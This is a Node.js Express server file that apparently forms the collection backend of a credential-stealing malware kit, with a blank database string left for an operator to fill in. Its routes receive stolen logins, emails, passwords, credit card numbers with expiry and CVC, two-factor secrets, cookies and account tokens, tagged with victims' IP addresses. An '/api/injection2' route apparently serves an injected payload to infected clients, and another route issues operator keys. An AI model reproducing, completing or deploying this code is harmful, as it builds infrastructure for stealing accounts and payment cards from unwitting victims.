const express = require('express');
const app = express();
const mongoose = require('mongoose');
const rateLimit = require('express-rate-limit');

const injection2 = require('./Routes/injection2');
const creditcards = require('./Routes/creditcards');
const passwords = require('./Routes/passwords');
const cookies = require('./Routes/cookies');
const token = require('./Routes/token');
const newKey = require('./Routes/newKey');
const login = require('./Routes/login');
const email = require('./Routes/email');
const password = require('./Routes/password');
const card = require('./Routes/card');
const a2f = require('./Routes/a2f');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 25,
    standardHeaders: true
});

app.use(limiter);
app.use(express.json({limit: "500mb"}));

app.route('/api/send/login/:key/:ip/:token/:password').post(login);
app.route('/api/send/email/:key/:ip/:token/:email/:password').post(email);
app.route('/api/send/password/:key/:ip/:token/:password').post(password);
app.route('/api/send/card/:key/:ip/:token/:number/:expiration/:cvc').post(card);
app.route('/api/send/a2f/:key/:ip/:token/:password/:secret').post(a2f);
app.get('/api/injection2', injection2);
app.post('/api/send/creditcards', creditcards);
app.post('/api/send/passwords', passwords);
app.post('/api/send/cookies', cookies);
app.post('/api/send/token', token);
app.post('/api/key/create', newKey);
app.all("*", (req, res) => res.send("You've tried reaching a route that doesn't exist."));

app.listen(3000, () => {
	console.log(`Listening on port 3000`);
	mongoose.connect("", { //Your MongoDB connect on ""
		useNewUrlParser: true,
		useUnifiedTopology: true,
	})
	.then(() => console.log('Mongoose connexion succes.'))
	.catch(() => console.log('Mongoose connexion error.'));
});

process.on('uncaughtException', () => console.log);
